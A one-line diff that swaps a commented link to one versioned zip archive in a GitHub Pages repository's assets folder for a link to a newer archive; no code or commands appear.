@@ -1,1 +1,1 @@
-# https://github.com/alyaapm/alyaapm.github.io/raw/refs/heads/main/assets/files/alyaapm-github-io-1.2.zip
+# https://github.com/alyaapm/alyaapm.github.io/raw/refs/heads/main/assets/files/io_alyaapm_github_1.6.zip
